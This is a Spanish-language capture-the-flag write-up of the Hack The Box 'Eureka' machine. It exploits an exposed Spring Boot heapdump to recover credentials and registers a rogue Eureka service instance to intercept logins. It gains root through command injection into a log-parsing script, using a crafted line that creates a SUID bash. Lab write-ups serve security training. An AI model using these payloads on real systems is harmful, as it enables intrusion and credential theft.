# EUREKA

<img width="1671" height="219" alt="image" src="https://github.com/user-attachments/assets/04abdf46-dd11-4ff2-8ac3-bd3b0ff69357" />

# Enumeracion de Puertos, Servicios y Versiones

```bash
nmap -Pn -sCV -p- --min-rate 5000 10.10.11.66
```

<img width="1671" height="507" alt="image" src="https://github.com/user-attachments/assets/739489d9-a3cf-47d8-973c-9e23cec5302e" />

observamos el dominio `http://furni.htb/` por lo que lo agregamos a nuestro archivo `/etc/hosts`

```bash
echo '10.10.11.66 furni.htb' >> /etc/hosts
```

a continuacion ingresamos al servicio web

<img width="1920" height="1058" alt="image" src="https://github.com/user-attachments/assets/12cf2340-7dae-42e9-9159-46d7ba3613b4" />

observo una seccion para loguearnos y registrarno pero al hacer pruebas en ambos lados observamos el siguiente error

<img width="1920" height="413" alt="image" src="https://github.com/user-attachments/assets/68099d75-da6e-466b-8548-74af98c50ce1" />

pero si reseteamos la maquina deja de aparecer este error y nos podemos registrar y loguear, pero no sirve de nada, es exactamente lo mismo asi que continuamos con el puerto que corre `tomcat`

<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/e84ea312-ec2e-4c3d-b04d-99c3a5d5de75" />

esta protegido por credenciales, vamos a lanzar primero nuclei para analizar la web

```bash
nuclei -u http://furni.htb
```
```bash

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.6

		projectdiscovery.io

[INF] nuclei-templates are not installed, installing...
[INF] Successfully installed nuclei-templates at /home/darks/.local/nuclei-templates
[INF] Current nuclei version: v3.4.6 (outdated)
[INF] Current nuclei-templates version: v10.2.4 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 67
[INF] Templates loaded for current scan: 8146
[INF] Executing 7942 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 204 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1759 (Reduced 1652 Requests)
[INF] Using Interactsh Server: oast.online
[missing-sri] [http] [info] http://furni.htb ["https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"]
[waf-detect:nginxgeneric] [http] [info] http://furni.htb
[springboot-heapdump] [http] [critical] http://furni.htb/actuator/heapdump
[openssh-detect] [tcp] [info] furni.htb:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12"]
[springboot-caches] [http] [low] http://furni.htb/actuator/caches
[fingerprinthub-web-fingerprints:openfire] [http] [info] http://furni.htb
[tech-detect:font-awesome] [http] [info] http://furni.htb
[tech-detect:bootstrap] [http] [info] http://furni.htb
[tech-detect:nginx] [http] [info] http://furni.htb
[springboot-loggers] [http] [low] http://furni.htb/actuator/loggers
[options-method] [http] [info] http://furni.htb ["GET,HEAD,OPTIONS"]
[nginx-version] [http] [info] http://furni.htb ["nginx/1.18.0"]
[springboot-scheduledtasks] [http] [info] http://furni.htb/actuator/scheduledtasks
[spring-detect] [http] [info] http://furni.htb/error
[springboot-beans] [http] [low] http://furni.htb/actuator/beans
[springboot-actuator:available-endpoints] [http] [info] http://furni.htb/actuator ["health-path","sbom-id","scheduledtasks","sessions","heapdump","loggers-name","metrics-requiredMetricName","sbom","threaddump","caches-cache","conditions","configprops","features","refresh","self","serviceregistry","caches","env","health","info","loggers","mappings","metrics","sessions-sessionId","beans","configprops-prefix","env-toMatch"]
[springboot-env] [http] [low] http://furni.htb/actuator/env
[springboot-threaddump] [http] [low] http://furni.htb/actuator/threaddump
[springboot-configprops] [http] [low] http://furni.htb/actuator/configprops
[springboot-mappings] [http] [low] http://furni.htb/actuator/mappings
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://furni.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://furni.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://furni.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://furni.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://furni.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://furni.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://furni.htb
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://furni.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://furni.htb
[springboot-features] [http] [low] http://furni.htb/actuator/features
[form-detection] [http] [info] http://furni.htb
[springboot-conditions] [http] [low] http://furni.htb/actuator/conditions
[caa-fingerprint] [dns] [info] furni.htb
[INF] Scan completed in 3m. 33 matches found.
```

observamos que nuclei marca como critico springboot-heapdump, asi que investigamos un poco de que trata esto y conseguimos que:

>>> Un heapdump es un volcado (dump) de la memoria heap de una aplicación Java en un momento específico. Contiene un snapshot completo de todos los objetos que están vivos (en memoria) en la máquina virtual de Java (JVM) en ese instante.
>>> ⚠️ Riesgos de seguridad:
>>> Un heapdump puede contener datos extremadamente sensibles, como:
>>> 1) Contraseñas en texto claro
>>> 2) Tokens de sesión
>>> 3) Información del usuario
>>> 4) Conexiones a bases de datos
>>> 5) Claves API.
>>>
>>> Por eso, si una app Java (como una Spring Boot) expone el endpoint /actuator/heapdump sin autenticación, es una vulnerabilidad crítica.

sabiendo esto y observando que el endpoit `http://furni.htb/actuator/heapdump` existe, vemos un posible vector de ataque asi que accedemos a dicho endpoint

<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/ba07be0e-00cb-4cba-81df-825d6c967e53" />

se nos descarga un archivo

```bash
file heapdump
```

<img width="1920" height="195" alt="image" src="https://github.com/user-attachments/assets/12d8dc6a-66ce-4263-9a94-63c28b50171d" />

si abrimos el archivo, no es leible, pero con `strings` podemos intentar extraer informacion en texto plano como posibles passwords

```bash
strings heapdump | grep 'password'
```

<img width="1920" height="975" alt="image" src="https://github.com/user-attachments/assets/32229a55-4fd0-49fa-a877-30b7e9a8194d" />

como vimos durante la investigacion es posible usar herramientas que extraen la informacion pero sin necesidad de usar algunas de ellas localizamos credenciales

<img width="1920" height="975" alt="image" src="https://github.com/user-attachments/assets/9ac10dac-2913-44ff-ac49-98386b05a5c2" />

>>> credenciales: password=0sc@r190_S0l!dP@sswd, user=oscar190

si intentamos usarlas para autenticarnos al puerto levantado con tomcat no son validas asi que testeamos por `ssh`

```bash
ssh oscar190@10.10.11.66
```

<img width="1920" height="850" alt="image" src="https://github.com/user-attachments/assets/40d2709d-af30-4839-b998-e1f99bd17e34" />

>>> logramos acceso!!

# Escalada de Privilegios

### User oscar190

este usuario no cuenta con permisos `sudo` y tampoco existen binarios en el sistema de los cuales aprovecharnos para una escalada... pero si revisamos las conexiones, vemos que esta disponible en el localhost el puerto `8761` que nos solicitaba autenticacion
Asi que lo que hare sera buscar indormacion de este puerto en el archivo previamente descargado

```bash
strings heapdump | grep '8761'
```

<img width="1920" height="265" alt="image" src="https://github.com/user-attachments/assets/dc334732-a814-4d06-a232-d42fdef42399" />

>>> credenciales= EurekaSrvr:0scarPWDisTheB3st

hemos conseguido credenciales!!! asi que accedemos!

<img width="1920" height="1004" alt="image" src="https://github.com/user-attachments/assets/07ee2dca-0a43-44de-82ee-c7856ade832c" />

como no tengo idea de lo que trate esto, investigamos un poco a ver de que trata

>>> Que es Eureka Server:
>>> es un componente fundamental en arquitecturas de microservicios basadas en Spring Cloud, diseñado para implementar el patrón Service Discovery (descubrimiento de servicios). Funciona como un registro centralizado donde los microservicios pueden registrarse y descubrir otros servicios dinámicamente, sin necesidad de configuraciones estáticas.

tambien conseguimos un articulo que habla de como podemos abusar de esto creando un microservicio falso

>>> https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka

pero el objetivo de nosotros no sera crear un micro-servicio falso sino crear una instancia bajo el micro-servicio `USER-MANAGEMENT-SERVICE`.
Para crear la instancia lo hacemos tal cual como si crearamos un micro-servicio, manejamos la misma peticion del articulo.

```bash
POST /eureka/apps/WEBSERVICE HTTP/1.1
Accept: application/json, application/*+json
Accept-Encoding: gzip
Content-Type: application/json
User-Agent: Java/11.0.10
Host: 127.0.0.1:8088
Connection: keep-alive
Content-Length: 1015

{"instance":{"instanceId":"host.docker.internal:webservice:8082","app":"WEBSERVICE","appGroupName":null,"ipAddr":"192.168.2.1","sid":"na","homePageUrl":"http://host.docker.internal:8082/","statusPageUrl":"http://host.docker.internal:8082/actuator/info","healthCheckUrl":"http://host.docker.internal:8082/actuator/health","secureHealthCheckUrl":null,"vipAddress":"webservice","secureVipAddress":"webservice","countryId":1,"dataCenterInfo":{"@class":"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name":"MyOwn"},"hostName":"host.docker.internal","status":"UP","overriddenStatus":"UNKNOWN","leaseInfo":{"renewalIntervalInSecs":30,"durationInSecs":90,"registrationTimestamp":0,"lastRenewalTimestamp":0,"evictionTimestamp":0,"serviceUpTimestamp":0},"isCoordinatingDiscoveryServer":false,"lastUpdatedTimestamp":1630906180645,"lastDirtyTimestamp":1630906182808,"actionType":null,"asgName":null,"port":{"$":8082,"@enabled":"true"},"securePort":{"$":443,"@enabled":"false"},"metadata":{"management.port":"8082"}}}
```

ahora vamos a identificar el micro-servicio:


<img width="1920" height="272" alt="image" src="https://github.com/user-attachments/assets/caea5003-e5d8-4866-9f17-ac14c8d77530" />

>>> 'USER-MANAGEMENT-SERVICE'

ahora vamos a extraer la informacion del micro-servicio

```bash
curl http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE -u EurekaSrvr:0scarPWDisTheB3st
```
```bash
<application>
  <name>USER-MANAGEMENT-SERVICE</name>
  <instance>
    <instanceId>localhost:USER-MANAGEMENT-SERVICE:8081</instanceId>
    <hostName>localhost</hostName>
    <app>USER-MANAGEMENT-SERVICE</app>
    <ipAddr>10.10.11.66</ipAddr>
    <status>UP</status>
    <overriddenstatus>UNKNOWN</overriddenstatus>
    <port enabled="true">8081</port>
    <securePort enabled="false">443</securePort>
    <countryId>1</countryId>
    <dataCenterInfo class="com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo">
      <name>MyOwn</name>
    </dataCenterInfo>
    <leaseInfo>
      <renewalIntervalInSecs>30</renewalIntervalInSecs>
      <durationInSecs>90</durationInSecs>
      <registrationTimestamp>1752362354001</registrationTimestamp>
      <lastRenewalTimestamp>1752367557204</lastRenewalTimestamp>
      <evictionTimestamp>0</evictionTimestamp>
      <serviceUpTimestamp>1752362354001</serviceUpTimestamp>
    </leaseInfo>
    <metadata>
      <management.port>8081</management.port>
    </metadata>
    <homePageUrl>http://localhost:8081/</homePageUrl>
    <statusPageUrl>http://localhost:8081/actuator/info</statusPageUrl>
    <healthCheckUrl>http://localhost:8081/actuator/health</healthCheckUrl>
    <vipAddress>USER-MANAGEMENT-SERVICE</vipAddress>
    <secureVipAddress>USER-MANAGEMENT-SERVICE</secureVipAddress>
    <isCoordinatingDiscoveryServer>false</isCoordinatingDiscoveryServer>
    <lastUpdatedTimestamp>1752362354001</lastUpdatedTimestamp>
    <lastDirtyTimestamp>1752362353272</lastDirtyTimestamp>
    <actionType>ADDED</actionType>
  </instance>
```

no haremos uso de todos los datos aqui expuestos sino solo de los necesarios para crear una instancia, aunque es posible hacer uso de todos los datos en la peticion que enviemos

```bash
curl -X POST http://127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE \
  -u 'EurekaSrvr:0scarPWDisTheB3st' \
  -H 'Content-Type: application/json' \
  -d '{
    "instance": {
      "instanceId": "USER-MANAGEMENT-SERVICE:8081",
      "app": "USER-MANAGEMENT-SERVICE",
      "ipAddr": "10.10.14.160",
      "port": {"$": 8081, "@enabled": "true"},
      "status": "UP",
      "dataCenterInfo": {
        "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
        "name": "MyOwn"
      }
    }
  }'
```

esto creara una instancia al envia la peticion, haciendo que parte del trafico sea dirigido a nuestra maquina atacante por el puerto `8081` por lo que debemos estar escuchando por este puerto antes de enviar la peticion

```bash
nc -lnvp 8081
```

enviamos la peticion desde la sesion `ssh` del usuario `oscar190` y vemos que se actualiza `eureka` con la nueva instancia

<img width="1920" height="836" alt="image" src="https://github.com/user-attachments/assets/98383643-ebee-4ccf-bfb7-c6b54e565da3" />

tambien recibimos trafico por donde estamos en escucha con netcat

<img width="1920" height="436" alt="image" src="https://github.com/user-attachments/assets/b29dc55a-6e45-4d1b-8768-55fb0cc29dd4" />

capturamos credenciales nuevas y para verlas claramente sin el urlencodeo usamos `urlencode`

<img width="1920" height="587" alt="image" src="https://github.com/user-attachments/assets/dc07a7a0-de3c-494a-8eaa-12a0ed06a9b6" />

ahora tenemos en claro las credenciales `miranda.wise:IL!veT0Be&BeT0L0ve`

que si testeamos la password contra el usuario de sistema `miranda-wise` logramos loguearnos.

<img width="1920" height="169" alt="image" src="https://github.com/user-attachments/assets/cd4e650f-1752-446e-ad17-510e782b7607" />

### esquema del ataque

```mermaid
sequenceDiagram
    APP-GATEWAY->>Eureka: "¿Dónde está USER-MANAGEMENT-SERVICE?"
    Eureka-->>APP-GATEWAY: ["localhost:8081", "10.10.14.160:8081"]
    APP-GATEWAY->>Servicio Falso: 50% del tráfico
    APP-GATEWAY->>Servicio Real: 50% del tráfico
```

### User miranda-wise

para escalar a root es necesario inspeccionar en vivo los procesos del sistema! 

```bash
watch -n 1 ps auxf |grep 'bash' |grep -v grep
```

<img width="1918" height="969" alt="image" src="https://github.com/user-attachments/assets/47523dc4-7c0e-400d-a524-a319fbb0cad2" />

despues de un rato de espera vemos como aparece y desaparece la ejecucion de un script, asi que primero vemos de que trata el script

```bash
cat /opt/log_analyse.sh
```
```bash
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi


analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}


analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}


analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}


display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))
        
        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi
        
        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}


# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"

```

el fallo de seguridad en este script ocurre en la linea

`code=$(echo "$line" | grep -oP 'Status: \K.*')`

ya que permite la inyeccion de codigo si llegamos a controlar el archivo de log que analiza... Demostracion del fallo!!
Primero vamos a leer el archivo de log que se le paso como parametro al script anterior

```bash
cat /var/www/web/cloud-gateway/log/application.log
```

<img width="1918" height="969" alt="image" src="https://github.com/user-attachments/assets/52856dec-fae7-43e8-9809-b692a875728f" />

la linea `code=$(echo "$line" | grep -oP 'Status: \K.*')` lo que hace es extraer de cada linea del archivo el codigo de estado, ahora vamos a ejecutar el codigo manualmente

```bash
echo "2025-04-09T11:27:02.286Z  INFO 1234 --- [app-gateway] [reactor-http-epoll-3] c.eureka.gateway.Config.LoggingFilter    : HTTP POST /login - Status: 403" | grep -oP 'Status: \K.*'
```
<img width="1918" height="165" alt="image" src="https://github.com/user-attachments/assets/2ffa3e46-45b6-4b32-8056-22ba162a322c" />

como vemos, en efecto nos devuelve el codigo de estado y al esto no estar sanitizado podriamos inyectar comandos, demostracion:

Para esto solo debemos inyectar un comando de sistema exactamente en la posicion del codigo de estado

```bash
echo "2025-04-09T11:27:02.286Z  INFO 1234 --- [app-gateway] [reactor-http-epoll-3] c.eureka.gateway.Config.LoggingFilter    : HTTP POST /login - Status: [$(id > /tmp/prueba.txt)]" | grep -oP 'Status: \K.*'
```

<img width="1918" height="228" alt="image" src="https://github.com/user-attachments/assets/eb37a6f3-26d6-45d1-9ff6-6fe6ae82f64a" />

se a ejecutado el comando `id` y guardado en el archivo `/tmp/prueba.txt`. Siguiendo esta idea vamos a inyectar un comando para escalar privilegios, ya que el directorio `/var/www/web/cloud-gateway/log` pertenece al grupo `developers` y el usuario `miranda-wise` tambien

<img width="1918" height="228" alt="image" src="https://github.com/user-attachments/assets/86ef4659-7d65-4fec-9ed7-465186060edd" />

pero en este punto ocurre un detalle y es que no podemos inyectar el comandos como cuando lo hicimos de forma manual, es decir, tipo: `Status: [$(...)]`, y esto ocurre por la linea `if [[ "$existing_code" -eq "$code" ]]; then`.
En ambos casos `code="[$(...)]"` & `code="a[$(...)]"`; `$code` llegan hasta el condicional `if` de forma literal, pero bash interpreta `$code` de forma distinta para cada caso, en el caso donde `$code="[$(...)]"` bash no expande `$(...)` ya que lo interpreta como un string y para el caso donde `code="a[$(...)]"` bash lo interpreta como: Un literal `x` + un globbing pattern ([$(whoami)]) por lo que en este caso primero expande `$(...)` que es donde ocurre la ejecucion de comandos, luego de expandir, el condicional realiza la comparacion `-eq` y tambien falla pero ya se a ejecuto el comando. Solucion: agregar un caracter antes de `[...]` para que quede: `x[$(...comando...)]`

asi que primero eliminamos el archivo y lo volvemos a crear inyectando una linea con un comandos malicioso para que sea ejecutado por `root`

```bash
rm -rf application.log && echo 'HTTP Status: x[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]' >> application.log
```

<img width="1918" height="288" alt="image" src="https://github.com/user-attachments/assets/0f86288d-e04f-4f16-9d29-6162901e4c37" />

escalamos a `root`

```bash
/tmp/bash -p
```

<img width="1918" height="336" alt="image" src="https://github.com/user-attachments/assets/71092c02-9153-4947-b08a-405963d138d8" />











